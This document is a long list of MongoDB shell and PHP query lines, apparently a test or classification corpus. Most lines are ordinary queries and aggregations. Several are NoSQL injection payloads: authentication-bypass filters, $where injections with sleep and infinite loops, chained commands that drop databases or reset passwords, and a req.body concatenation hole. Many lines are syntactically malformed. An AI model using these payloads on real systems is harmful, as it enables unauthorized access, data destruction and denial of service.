db.mycol.find({$and:[{by:"tutorials point"},{title: "MongoDB Overview"}]}).pretty()
db.collection('users').findOne({username: {$ne: null}, password: {$ne: null}})
Document.find({ type: { $gte: ""} })
Document.find({ type: { $ne: 0} })
db.books.insert({ title: 'The Hobbit', author: 'J.R.R. Tolkien' })
db.books.find({ title: 'The Hobbit' })
db.logins.find({ username: 'tolkien', password: 'hobbit' })
db.logins.find({ username: { $ne: 1 }, password: { $ne: 1 } })
db.doc.find({ username: 'tolkien', $or: [ {}, { a: 'a', password: '' } ], $comment: 'successful MongoDB injection' })
db.user.save({_id : 1234, name : {first: "foo", last : "bar"}})
db.user.find({_id : 1234 })
db.user.find({name.first : "foo"})
db.getMongo().getDBNames()
db.members.find({login:"admin", pass: {$ne: "parol1"} } )
db.books.insert({ title: "As you like it", Author: "William Shakespeare"})
db.foo.find( { $or : [ { a : 1 } , { b : 2 } ] } )
db.foo.find( { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] } )
db.myCollection.find( { $where: this.a > 3 } );
db.collection.find( { $where : function() { return artist == "Weezer"; }} )
db.collection.find ( $where : function() {var len = artist.length;for (int i=2; i<len; i++) {if (len % I == 0) return false;}return true; })
db.bands.find()
db.products.find( { qty: { $gt: 25 } } )
db.test.save( { a: 1 } )
db.movie.insert({name:"tutorials point"})
db.dropDatabase()
db.createCollection("mycol", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } )
db.mycollection.drop()
db.mycol.insert({ _id: ObjectId(7df78ad8902c), title: 'MongoDB Overview', description: 'MongoDB is no sql database', by: 'tutorials point', url: 'http://www.tutorialspoint.com', tags: ['mongodb', 'database', 'NoSQL'], likes: 100})
db.mycol.find().pretty()
db.mycol.find({$or:[{by:{$ne: null}},{title: "MongoDB Overview"}]}).pretty()
db.mycol.find({$or:[{by:"tutorials point"},{title: "MongoDB Overview"}]}).pretty()
db.mycol.update({title:'MongoDB Overview'},{$set:{title:'New MongoDB Tutorial'}})
db.mycol.remove({title:'MongoDB Overview'})
db.mycol.find({},{title:1,_id:0})
db.students.find( { grades: { $elemMatch: {mean: { $gt: 70 },grade: { $gt:90 }} } },{ grades.$.std: 1 } )
db.students.find({ $or:[{by:{$ne: null}}, {grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 } } } }]}, { grades.$.std: 1 } )
db.createCollection("mycol", { capped : true, autoIndexId : true,size : 6142800, max : 10000 } )
db.collection('users').findOne({ username: {$ne: null},password: {$ne: null}})
db.mycol.find({$or:[{by:{$ne: null}},{title: "MongoDB Overview"}]})
db.students.find( { grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 } } } }, { grades.$.std: 1 } )
db.students.find({ $or:[{by:{$ne: null}}, {grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 }} } }]}, { grades.$.std: 1 } )
db.users.find({username: {$gt: ""},password: {$gt: ""}})
db.restaurant.updateMany({username: {$ne: null},,{ $set: { Review : true } }})
var query = { $where: "this.canceledOrders > " + req.body.canceledOrders } db.collection('users').find(query).each(function(err, doc) { console.log(doc); })
db.articles.find({$where: "this.hidden == false && this.category == '"+category+"'" })
db.articles.find({$where: "this.hidden == false && this.category == ' '; return '' == ' ' })
db.users.find({username: 'dummy'});return{username: tojson(db.getName()),password:2}//,password:'dummy'*^
db.users.find({username: 'dummy'});return{username: tojson(db.getCollectionName()),password:2}//,password:dummy*^
db.users.save({msg: '1';sleep(10000);var%20foo='bar'})
db.users.save({msg: '1';var%20d%20=%20new%20Date();%20var%20cd%20=%20null;%20do%20{%20cd%20=%20new%20Date();%20}%20while(cd-d%20<%2010000);var%20foo='bar})
db.library.find({ISBN: '0763754891' || '1' =='1' })
db.collection.find({$where: 'orders' > '';return true;var foo='bar'})
db.collection.find({$where: 'orders' > '0;while(true);var foo='bar'})
db.admins.find({user: 'rafid', $and: [passcode: '', validation_key: '' ]})
db.admins.find({user: 'rafid', $or:[{},{a: 'a',$and: [passcode: '',validation_key: '']}, $comment: 'haha' ]})
db.library.find{by: 'George R. R. Martin',title: 'Game of Thrones'}
db.library.find({by: 'George R. R. Martin',title: 'Game of Thrones'});db.runCommand('db.dropDatabase()');({'var foo='bar'})
db.users.find({username: 'rafid'});db.users.findAndModify({ query: { username:'rafid'}, update:{$set:{a:'a', password: 'dragonball'}},$comment: 'successful MongoDB injection'})
db.logins.find({ username: { $ne: 0 }, password: { $ne: 0 } })
db.logins.find({ username: { $gt: 0 }, password: { $gt: "" } })
db.logins.find({ username: { $gte: "" }, password: { $gte: "" } })
db.logins.find({ username: { $lt: "zzzzzzzzzzzzzzzzzzzzzzzzzz" }, password: { $lt: "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" } })
db.logins.find({ username: { $lte: "zzzzzzzzzzzzzzzzzzzzzzzzzz" }, password: { $lte: "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" } })
db.logins.find({ username: { $nin: [0] }, password: { $nin: [0] } })
db.collection('users').findOne({ username: "dummy", $or: [ {}, { password: "" } ]})
db.collection('users').findOne({ username: "admin", Password : {$or: [ {}, "abcd" ] }})
db.collection('users').findOne({username: "admin", Password : {$and: [{1==1}] }})
db.collection('users').find({ username: {$exists: true}, Password : {$exists: true}})
db.collection('users').find({username: {$not: ""}, Password : {$not: ""}})
db.collection('users').find({ username: {$not: null},Password : {$not: null}})
db.collection('users').find({username: {$nor: [{0==1}, {1==2}]},Password: {$nor: [{0==1},{1==2}]}})
db.collection.find({$where: name == ''; return '' == ''})
db.collection('users').find({username: {$type: "string"},Password: {$type: "string"}})
db.collections.find({$where: quantity > '';sleep(50000);;var foo='bar'})
db.collection.find({$where: name == '';return(db.getCollectionNames().length == 2);var foo='bar')}
db.users.find({username: 'dummy'});db.users.drop();db.users.insert({username:'rafid', password:'rafid'})
db.users.find({name: 'rafid'});db.users.remove(.*);db.users.insert({ name: 'dummy'})
db.users.find({name: 'dummy', $where: 1==1}, { name: '1', password: '1'})
db.users.find({username: 'dummy'});return{something:1,something:2}//, password: 'dummy'*^
db.users.find({username: /.*/, password: /.*/})
db.users.find({username: {$nin: [/./]}, password: {$nin: [/./]}})
db.users.find({username: {$in: [/.*/]}, password: {$in: [/.*/]}})
db.users.find({Username: {$in:[/.a*]}, password: {$nin:[/./]}})
db.users.find({Username: { $regex: /.*/i }, password: { $regex: /.*/i }})
db.users.find({Username: { $regex: /^a/ }, password: { $regex: /.*/ }})
db.collection.find({by: "Tutorials point"})
db.collection.find({likes: {$lt:50}})
db.collection.find({likes: {$lte:50}})
db.collection.find({likes: {$gt:50}})
db.collection.find({likes: {$gte:50}})
db.collection.find({likes: {$ne:5}, title: "hex"})
db.collection.find({$and: [{by: "tut"}, {likes: {$gt:100}}]})
db.collection.find({$and: [{by: "tut"}, {likes: {$gt:100}}, {title: "hex"}]})
db.collection.find({$or: [{by: "tut"}, {likes: {$gt:100}}]})
db.collection.find({$or: [{by: "tut"}, {likes: {$gt:100}}, {title: "hex"}]})
db.collection.find({$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]})
db.collection.find({likes: {$ne:5}, title: "hex"}, {by:1,_id:0})
db.collection.find({$and: [{by: "tut"}, {likes: {$gt:100}}]}, {by:1,_id:0})
db.collection.find({$and: [{by: "tut"}, {likes: {$gt:100}}, {title: "hex"}]}, {by:1,_id:0})
db.collection.find({$or: [{by: "tut"}, {likes: {$gt:100}}]}, {by:1,_id:0})
db.collection.find({$or: [{by: "tut"}, {likes: {$gt:100}}, {title: "hex"}]}, {by:1,_id:0})
db.collection.find({$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]}, {by:1,_id:0})
db.collection.find({$and[{for: "python"},$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]]}, {by:1,_id:0})
db.collection.find({$and[{for: "python"},$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]]})
db.collection.find({awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}})
db.collection.find({name.first: "Yukihiro",name.last: "Matsumoto"})
db.collection.find({$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}} ]})
db.collection.find({},{_id: 0, name.last: 1, contribs: { $slice: 2 }})
db.collection.find({$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}}]},{_id: 0,name.last: 1,contribs: { $slice: 2 }})
db.collection.find({$and[{for: "python"},$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]]},{_id: 0,name.last: 1,contribs: { $slice: 2 }})
db.collection.findOne({$or: [{ name.first: /^G/ },{ birth: { $lt: new Date('01/01/1945') } }]})
db.bios.findOne({$or: [{ name.first: /^G/ },{ birth: { $lt: new Date('01/01/1945') } }] },{ name: 1, contribs: 1, _id: 0 })
db.collection.findOne({ contribs: 'OOP' },{ _id: 0, name.first: 0, birth: 0 })
db.collection.findOne({$or: [{ name.first: /^G/ },{ birth: { $lt: new Date('01/01/1945') } }]},{ _id: 0, name.first: 0, birth: 0 })
db.collection.findAndModify({query: {$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]},sort: { rating: 1 },update: { $inc: { score: 1 } },fields: {_id:0, score: 1},bypassDocumentValidation: true})
db.collection.findAndModify({query: { name: "Andy" },sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true})
db.collection.findAndModify({query: { name: "Tom", state: "active", rating: { $gt: 10 } },sort: { rating: 1 },update: { $inc: { score: 1 } }})
db.collection.findAndModify({query: { $or: [{ name.first: /^G/ },{ birth: { $lt: new Date('01/01/1945') } }]},sort: { rating: 1 },update: { $inc: { score: 1 } }})
db.collection.findAndModify({query: {$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}},{ score: {$gt: 100}}]},sort: { rating: 1 },update: { $inc: { score: 1 } }})
db.people.findAndModify({query: { name: "Gus", state: "active", rating: 100 },sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true})
db.people.findAndModify({query: {$and[{for: "python"},$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]]},sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true})
db.people.findAndModify({query: { name: "Pascal", state: "active", rating: 25 },sort: { rating: 1 },update: { $inc: { score: 1 } },upsert: true,new: true})
db.people.findAndModify({query: { state: "active" },sort: { rating: 1 },remove: true})
db.people.findAndModify({query: {$or:[{name: {first: "Yukihiro",last: "Matsumoto"}},{awards: {$elemMatch: {award: "Turing Award",year: { $gt: 1980 }}}}]},sort: { rating: 1 },remove: true})
db.myColl.findAndModify({query: { category: "cafe", status: "a" },sort: { category: 1 },update: { $set: { status: "Updated" } },collation: { locale: "fr", strength: 1 }})
db.myColl.findAndModify({query: {category: "cafe",$or: [{status: "a"},{status: "A"}]},sort: { category: 1 },update: { $set: { status: "Updated" } },collation: { locale: "fr", strength: 1 }})
db.scores.findOneAndDelete({ name: "M. Tagnum" })
db.collection.findAndModify({$and[{for: "python"},$or: [{title: "hex"},$and: [{by: "tut"}, {likes: {$gt:100}}]]]},{sort: { likes: 1},projection : {title:1, _id:0}})
db.scores.findOneAndDelete({ name: "A. MacGyver" },{ sort : { points: 1 }, maxTimeMS : 5 })
db.myColl.findOneAndDelete({ category: "cafe", status: "a" },{ collation: { locale: "fr", strength: 1 } })
db.scores.findOneAndReplace({ score: { $lt : 20000 } },{ team: "Observant Badgers", score: 20000 })
db.scores.findOneAndReplace({ score: { $lt : 20000 } },{ team: "Observant Badgers", score: 20000 },{ sort: { score: 1 } })
db.scores.findOneAndReplace({ score: { $lt : 22250 } },{ team: "Therapeutic Hamsters", score: 22250 },{ sort : { score: 1 }, project: { _id: 0, team: 1 } })
db.scores.findOneAndReplace({ team: "Fortified Lobsters" },{ _id: 6019, team: "Fortified Lobsters" , score: 32000},{ upsert : true, returnNewDocument: true })
db.myColl.findOneAndReplace({ category: "cafe", status: "a" },{ category: "cafÉ", status: "Replaced" },{ collation: { locale: "fr", strength: 1 } })
db.scores.findOneAndUpdate({ name: "R. Stiles" },{ $inc: { points: 5 } })
db.scores.findOneAndUpdate({ name: "A. MacDyver" },{ $inc : { points: 5 } },{ sort : { points: 1 } })
db.scores.findOneAndUpdate({ name: "A. MacDyver" },{ $inc : { points: 5 } },{ sort : { points: 1 }, projection: { assignment: 1, points: 1 } })
db.scores.findOneAndUpdate({ name: "A.B. Abracus" },{ $set: { name: "A.B. Abracus", assignment: 5}, $inc : { points: 5 } },{ sort: { points: 1 }, upsert:true, returnNewDocument : true })
db.myColl.findOneAndUpdate({ category: "cafe" },{ $set: { status: "Updated" } },{ collation: { locale: "fr", strength: 1 } });
var mapFunction1 = function() {emit(this.cust_id, this.price);};var reduceFunction1 = function(keyCustId, valuesPrices) {return Array.sum(valuesPrices);};db.orders.mapReduce(mapFunction1,reduceFunction1,{ out: "map_reduce_example" })
var mapFunction2 = function() {for (var idx = 0; idx < this.items.length; idx++) {var key = this.items[idx].sku;var value = {count: 1,qty: this.items[idx].qty};emit(key, value);}};var reduceFunction2 = function(keySKU, countObjVals) {reducedVal = {count: 0, qty: 0 };for (var idx = 0; idx < countObjVals.length; idx++) {reducedVal.count += countObjVals[idx].count;reducedVal.qty += countObjVals[idx].qty;}return reducedVal;};var finalizeFunction2 = function (key,reducedVal) {reducedVal.avg = reducedVal.qty/reducedVal.count;return reducedVal;};db.orders.mapReduce( mapFunction2,reduceFunction2,{out: { merge: "map_reduce_example" },query: { ord_date:{ $gt: new Date('01/01/2012') }},finalize: finalizeFunction2})
var mapper = function () {emit(this.gender, 1);};var reducer = function(gender, count){return Array.sum(count);};db.sourceData.mapReduce(mapper,reducer,{out : "example1_results"});
var mapper = function () {var x = {age : this.age, name : this.name};emit(this.gender, {min : x , max :x});};var reducer =function(key, values){var res = values[0];for (var i = 1; i < values.length; i++) {if(values[i].min.age < res.min.age)res.min= {name : values[i].min.name, age : values[i].min.age};if (values[i].max.age > res.max.age)res.max = {name:values[i].max.name, age : values[i].max.age};};return res;};db.sourceData.mapReduce(mapper,reducer,{out :"example2_results"});
var mapper = function () {var hobbys = this.hobbies.split(',');for (i in hobbys) {emit(hobbys[i], 1);}};var reducer = function(key, values) {var count = 0;for (index in values) {count += values[index];}return count;};db.sourceData.mapReduce(mapper,reducer,{out : "example3_results"});
db.runCommand( {mapReduce: "books",map: function() {for (var index = 0; index < this.authors.length; ++index) {var author =this.authors[ index ];emit( author.firstName + " " + author.lastName, 1 );}},reduce: function(author, counters) {count = 0;for (var index = 0; index < counters.length; ++index) {count += counters[index];}return count;},out: { inline: 1 }} );
var map = function(){emit(this.url, 1);}var reduce = function(key, values){var res = 0;values.forEach(function(v){ res += 1});return {count: res};}db.sites.mapReduce(map, reduce, { out: "mapped_urls" });
db.products.save( { item: "book", qty: 40 } )
db.products.save({ item: "envelopes", qty : 100, type: "Clasp" },{ writeConcern: { w: "majority", wtimeout: 5000 } })
db.products.insert([{ _id: 11, item: "pencil", qty: 50, type: "no.2" },{ item: "pen", qty: 20 },{ item: "eraser", qty: 25 }])
db.products.insert([{ _id: 20, item: "lamp", qty: 50, type: "desk" },{ _id: 21, item: "lamp", qty: 20, type: "floor" },{ _id:22, item: "bulk", qty: 100 }],{ ordered: false })
db.products.insert({ item: "envelopes", qty : 100, type: "Clasp" },{ writeConcern: { w: "majority", wtimeout: 5000 } })
try {db.products.insertOne({ item: "envelopes", qty: 100, type: "Self-Sealing" },{ writeConcern: { w : "majority",wtimeout : 100 } });} catch (e) {print (e);}
try {db.products.insertMany( [{ _id: 10, item: "large box", qty: 20 },{ _id: 11, item: "small box", qty: 55 },{ _id: 12, item: "medium box", qty: 30 }] );} catch (e) {print (e);}
try {db.products.insertMany([{ _id: 10, item: "large box", qty: 20 },{ _id: 11, item: "small box", qty: 55 },{ _id: 12, item:"medium box", qty: 30 }],{ w: "majority", wtimeout: 100 });} catch (e) {print (e);}
db.restaurants.find().sort( { borough: 1, address.zipcode: 1 } )
db.runCommand( {mapReduce: "books",scope: { currency: "US" },map: function() {emit( this.publisher, { count: 1, price:this.price } );},reduce: function(publisher, values) {var value = { count: 0, price: 0 };for (var index = 0; index <values.length; ++index) {value.count += values[index].count;value.price += values[index].price;}return value;},finalize:function(publisher, value) {value.average = currency + ( value.price / value.count ).toFixed(2);return value;},out: {replace: "results"}} )
db.runCommand( {mapReduce: "books",scope: { currency: "US" },map: function() {emit( this.publisher, { count: 1, price: this.price } );},reduce: function(publisher, values) {var value = { count: 0, price: 0 };for (var index = 0; index < values.length; ++index) {value.count += values[index].count;value.price += values[index].price;}return value;},finalize: function(publisher, value) {value.average = currency + ( value.price / value.count ).toFixed(2);return value;},query: { authors.lastName: { $in: [ "Cantelon", "O'Higgins" ] } },limit: 2,out: {reduce: "results"}} )
db.customers.find({$and: [{$or: [{last_login: "2017-10-08"},{last_login: "2017-10-07"},{last_login: "2017-10-06"}]},{$or: [{address.country: "Spain"},{address.country: "France"}]}]})
db.customers.find({$and: [{ last_login: { $in: ["2017-10-08", "2017-10-07", "2017-10-06"] }},{ address.country: { $in:["Spain", "French"] }},]})
db.customers.find({$and: [{ last_login: { $gte: "2017-10-06" }},{ address.country: { $in: ["Spain", "French"] }},]})
db.customers.find({address.country: { $nin: ["Spain", "French"] }})
db.car.findAndModify({query: { name: "Alto" },sort: { cno: 1 },update: { $inc: { speed: 10 } },})
db.car.findAndModify({query: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 },sort: { cno: 1 },update: { $inc: {speed: 20 } },upsert: true,new: true})
db.car.findAndModify({query: { name: "WagonR" },sort: { cno: 1 },update: { $inc: { speed: 5 } },upsert: <strong>true</strong>})
db.car.findAndModify({query: { name: "Alto" },sort: { cno: 1 },remove: true})
$col->findAndModify(array(inprogress => false, name => "Biz report"),array($set => array(inprogress => true, started=> new MongoDate())),null,array(sort => array(priority => -1),new => true,));
try {$retval = $col->findAndModify(array(inprogress => false, name => "Next promo"),array($pop => array(tasks => -1)),array(tasks => array($pop => array("stuff"))),array(new => true));} catch(MongoResultException $e) {echo $e->getCode(), " : ", $e->getMessage(), "\n";var_dump($e->getDocument());}
$studentCollection->findAndModify(array(_id => $studentId), ($set => array(Active => false, Reason=> "Duplicate entry" DeleteDate => new MongoDate())), (Payments => 1), array(new => false ));
try {db.restaurant.replaceOne({ name: "Pizza Rat's Pizzaria" },{ _id: 4, name: "Pizza Rat's Pizzaria", Borough: "Manhattan", violations: 8 },{ upsert: true });} catch (e){print(e);}
try {db.restaurant.replaceOne({ name: "Pizza Rat's Pizzaria" },{ name: "Pizza Rat's Pub", Borough: "Manhattan", violations: 3 },{ w: "majority", wtimeout: 100 });} catch (e) {print(e);}
$map = new \MongoCode("function () { this.value['p'] = this.value['p'].replace('$from', '$to');emit(this._id, this.value);}"); $collection = $this->mongoCollection(); $reduce = new \MongoCode("function () { }"); $collection_name = $collection->getName(); $collection->db->command([ mapreduce => $collection_name, map => $map, reduce => $reduce, out => [merge => $collection_name], query => $query, sort => [_id => 1] ]);
db.media.find({mediaContainer:"ContainerS3"}).forEach(function(e,i) { e.url=e.url.replace("//a.n.com","//b.n.com"); db.media.save(e); });
db.collection('ABC').find({url: /helloWorldt/}).toArray((err, docs) => {docs.forEach(doc => { let URL = doc.URL.replace('helloWorldt', 'helloWorld'); db.collection('ABC').updateOne({_id: doc._id}, {URL}); }); });
db.collection.insert( {name:"name-here"} )$collection->insert(array(name => "name-here"));
db.collection.save( {id:"001", name:"name-here"} )$collection->save(array(_id => "59d77a00640d6ca80400002d",title=>"title-here"));
db.collection.update( {title:"old-title"}, {$set:{title:"new-title"}} )$collection->update(array(title=>"MongoDB Tutorial"),array($set=>array(title=>"MongoDB")),);
db.collection.update( {title:"old-title"}, {$set:{title:"new-title"}}, {multi:true} )$collection->update(array(title=>"MongoDB Tutorial"),array($set=>array(title=>"MongoDB")),array(multiple=>true));
db.collection.remove( {title:"title-here"} )$collection->remove(array(title=>"MongoDB"));
db.collection.remove( {title:"title-here"}, 1 )$collection->remove(array(title=>"MongoDB"),array(justOne => true));
db.restaurant.updateOne({ name: "Central Perk Cafe" },{ $set: { violations: 3 } });$collection->update(array(name => "Central Perk Cafe"),array($set => array(violations=>3)),array(multiple => false));
db.restaurant.updateOne({ name: "Pizza Rat's Pizzaria" },{ $inc: { violations: 3}, $set: { Closed: true } },{ w: "majority", wtimeout: 100 });$collection->update(array(name => "Pizza Rat's Pizzaria"),array($inc => array(violations=>3), $set => array(Closed => true)),array(multiple => false, w => "majority", wTimeoutMS => 100));
db.myColl.updateOne({ category: "cafe" },{ $set: { status: "Updated" } },{ collation: { locale: "fr", strength: 1 } });$collection->update(array(category => "cafe"),array($set => array(status => "Updated")),array(multiple => false, collation => array(locale => "fr", strength => 1)));
db.restaurant.updateMany({ violations: { $gt: 4 } },{ $set: { Review: true } });$collection->update(array(violations =>array($gt => 4)),array($set => array(Review => true)),array(multiple => true));
db.restaurant.updateMany({ name: "Pizza Rat's Pizzaria" },{ $inc: { violations: 3}, $set: { Closed: true } },{ w: "majority", wtimeout: 100 });$collection->update(array(name => "Pizza Rat's Pizzaria"),array($inc => array(violations=>3), $set => array(Closed => true)),array(multiple => true, w => "majority", wTimeoutMS => 100));
db.myColl.updateMany({ category: "cafe" },{ $set: { status: "Updated" } },{ collation: { locale: "fr", strength: 1 } });$collection->update(array(category => "cafe"),array($set => array(status => "Updated")),array(multiple => true, collation => array(locale => "fr", strength => 1)));
db.demo.group({key: {person: true},initial: {sumscore: 0,sumforaverageaveragescore: 0,countforaverageaveragescore: 0,countstar: 0},reduce: function(obj, prev) {prev.sumscore = prev.sumscore + obj.score - 0;prev.sumforaverageaveragescore += obj.score;prev.countforaverageaveragescore++;prev.minimumvaluescore = isNaN(prev.minimumvaluescore) ? obj.score : Math.min(prev.minimumvaluescore, obj.score);prev.maximumvaluescore = isNaN(prev.maximumvaluescore) ? obj.score : Math.max(prev.maximumvaluescore, obj.score);if (true != null) if (true instanceof Array) prev.countstar += true.length;else prev.countstar++;},finalize: function(prev) {prev.averagescore = prev.sumforaverageaveragescore / prev.countforaverageaveragescore;delete prev.sumforaverageaveragescore;delete prev.countforaverageaveragescore;},cond: {score: {$gt: 0},person: {$in: ["bob", "jake"]}}});
db.EMPLOYEES.group({key: {SALARY: true},initial: {countstar: 0},reduce: function(obj, prev) {if (true != null) if (true instanceof Array) prev.countstar += true.length;else prev.countstar++;},cond: {SALARY: {$gt: 1000}}});
db.shop.group({initial: {},reduce: function(obj, prev) {prev.article = isNaN(prev.article) ? obj.article : Math.max(prev.article, obj.article);}});
db.collection.aggregate( [{ $match : {createdDate:{ $gt : ISODate("2015-05-01T00:00:00.000Z"), $lte : ISODate("2015-05-20T23:59:59.000Z")}}},{ $group : { _id : { year: { $year: "$createdDate" },month: { $month: "$createdDate" },day: { $dayOfMonth : "$createdDate" },appId : "$appId"}}}, { $group : { _id : {appIdd: '$_id.appId'}, count: { $sum: 1 }}}, { $project: { created_date_str: {$concat:["$_id.year","-","$_id.month","-","$_id.day","T00:00:00Z"]},count: 1}}, { $project: { _id : 0, created_date: { ISODate("$created_date_str") }, count: 1}}]);
$top_orders = Orders::aggregate(array( array($group => array(_id => '$pro_id', count => array( $sum => 1 ) )), array( $match => array( count => array( $gt => 100 ))), array( $sort => array( count => -1 ) ), array( $limit => 5 ) ));
db.old_user.find({},{username:1,password:1}).forEach(function(data){ db.users.insert(data)})
db.shop.group({initial: {},reduce: function(obj, prev) {prev.maximumvalueprice = isNaN(prev.maximumvalueprice) ? obj.price : Math.max(prev.maximumvalueprice, obj.price);}}).forEach(function(data){db.shop.find({price: 100}, {article: 1,dealer: 1,price: 1})})
db.shop.aggregate([ { $sort: { price: -1 } }, { $group: {_id: null, article: { $first: "$article" }, dealer: { $first: "$dealer" }, price: { $first: "$price" } } } ])
db.shop.aggregate([{ $sort: { price: 1 } },{ $group: { _id: null, article: { $last: "$article" }, dealer: { $last: "$dealer" }, price: { $last: "$price" } } } ])
db.shop.group({key: {dealer: true},initial: {},reduce: function(obj, prev) {prev.maximumvalueprice = isNaN(prev.maximumvalueprice) ? obj.price : Math.max(prev.maximumvalueprice, obj.price);}});
db.shop.group({key: {dealer: true},initial: {countarticle: 0},reduce: function(obj, prev) {if (obj.article != null) if (obj.article instanceof Array) prev.countarticle += obj.article.length;else prev.countarticle++;}});
db.shop.group({initial: {},reduce: function(obj, prev) {prev.article = isNaN(prev.article) ? obj.article : Math.max(prev.article, obj.article);}});
db.shop.find({}, {article: 1,dealer: 1,price: 1}).limit(1).sort({price: -1});
db.shop.group({key: {article: true},initial: {},reduce: function(obj, prev) {prev.price = isNaN(prev.price) ? obj.price : Math.max(prev.price, obj.price);}})
db.runCommand({distinct: "officers",key: "address"});
db.officers.find({officer_id: {$lt: 5}}, {officer_name: 1,address: 1}).sort({officer_name: -1,address: 1});
db.officers.group({key: {address: true},initial: {countstar: 0},reduce: function(obj, prev) {if (true != null) if (true instanceof Array) prev.countstar += true.length;else prev.countstar++;}});
db.employees.group({key: {emp_name: true},initial: {Total_working_hours: 0}, reduce: function(obj, prev) {prev.Total working hours = prev.Total working hours + obj.working_hours - 0;}});
db.officers.find({address: "Luck%"}, {officer_name: 1});
db.officers.find({address: "Luc_now"}, {officer_name: 1});
db.student.find( {sex: { $not: /^M.*/}}).pretty();
db.officers.find({officer_name: {$in: ["Ajeet", "Vimal", "Deepika"]}});
db.officers.find({officer_name: {$not: {$in: ["Ajeet", "Vimal", "Deepika"]}}});
db.officers.find({officer_name: {$ne: null}});
db.officers.find({officer_name: {$gte: 3,$lte: 5}});
db.officers.find({officer_name: {$lt: 3,$gt: 5}});
db.officers.find({officer_name: null});
db.employee.find().limit(3).skip(1);
db.employee.aggregate({ $sample: { size: 1 } },)
db.accounts.find( username: username, password: password)
db.user.save({_id: 1234, name: {first: "foo", last: "bar"}})
db.createCollection("mycol", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } )
db.students.find( { grades: { $elemMatch: { mean: { $gt: 70 }, grade: { $gt:90 } }}}, { grades.$.std: 1 } )
db.orders.aggregate([{$match: {status: "A"}},{$group: {_id: "$cust_id", total: {$sum: "$amount"}}}])
db.orders.count()
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } )
db.collection.aggregate([{ $group: { _id: null, count: { $sum: 1 } } }])
db.collection.aggregate([{ $match: {title: "MongoDB"} },{ $group: { _id: null, count: { $sum: 1 } } }])
db.collection.find( { a: 5, b: 5 } ).count()
db.collection.find( { a: 5, b: { $gt: 10 } } ).count()
db.collection.find( { a: 5, b: { $in: [ 1, 2, 3 ] } } ).count()
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } ,{ $limit: 10 })
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } ,{ $limit: 10, $skip: 5 })
db.orders.count( { ord_dt: { $gt: new Date('01/01/2012') } } ,{ $maxTimeMS: 1000 })
db.collection.distinct()
db.inventory.distinct( "sizes" )
db.inventory.distinct( "item.sku" )
db.inventory.distinct( "item.sku", { dept: "A" } )
db.myColl.distinct( "category", {}, { collation: { locale: "fr", strength: 1 } } )
db.scores.aggregate( [{$addFields: {totalHomework: { $sum: "$homework" } ,totalQuiz: { $sum: "$quiz" }}}] )
db.scores.aggregate( [{$addFields: {totalHomework: { $sum: "$homework" } ,totalQuiz: { $sum: "$quiz" }}},{$addFields: { totalScore:{ $add: [ "$totalHomework", "$totalQuiz", "$extraCredit" ] } }}] )
db.vehicles.aggregate( [{$addFields: {specs.fuel_type: "unleaded"}}] )
db.fruit.aggregate( [{$addFields: {_id : "$item",item: "fruit"}}] )
db.artwork.aggregate( [{$bucket: {groupBy: "$price",boundaries: [ 0, 200, 400 ],default: "Other",output: {count: { $sum: 1 },titles: { $push: "$title" }}}}] )
db.artwork.aggregate( [{$facet: {price: [{$bucket: {groupBy: "$price",boundaries: [ 0, 200, 400 ],default: "Other",output: {count: { $sum: 1 },artwork: { $push: { title: "$title", price: "$price" } }}}}],year: [{$bucket: {groupBy: "$year",boundaries: [ 1890, 1910, 1920, 1940 ],default: "Unknown",output: {count: { $sum: 1 },artwork: { $push: { title: "$title", year: "$year" } }}}}]}}] )
db.artwork.aggregate( [{$bucketAuto: {groupBy: "$price",buckets: 4}}] )
db.artwork.aggregate( [{$facet: {price: [{$bucketAuto: {groupBy: "$price",buckets: 4}}],year: [{$bucketAuto: {groupBy: "$year",buckets: 3,output: {count: { $sum: 1 },years: { $push: "$year" }}}}],area: [{$bucketAuto: {groupBy: {$multiply: [ "$dimensions.height", "$dimensions.width" ]},buckets: 4,output: {count: { $sum: 1 },titles: { $push: "$title" }}}}]}}] )
db.matrices.aggregate( [ { $collStats: { latencyStats: { histograms: true } } } ] )
db.matrices.aggregate( [ { $collStats: { count: { } } } ] )
db.scores.aggregate([{$match: {score: {$gt: 80}}},{$count: "passing_scores"}])
db.places.aggregate([{$geoNear: {near: { type: "Point", coordinates: [ -73.99279 , 40.719296 ] },distanceField:"dist.calculated",maxDistance: 2,query: { type: "public" },includeLocs: "dist.location",num: 5,spherical: true}}])
db.places.aggregate([{$geoNear: {near: { type: "Point", coordinates: [ -73.99279 , 40.719296 ] },distanceField: "dist.calculated",minDistance: 2,query: { type: "public" },includeLocs: "dist.location",num: 5,spherical: true}}])
db.employees.aggregate( [{$graphLookup: {from: "employees",startWith: "$reportsTo",connectFromField: "reportsTo",connectToField: "name",as: "reportingHierarchy"}}] )
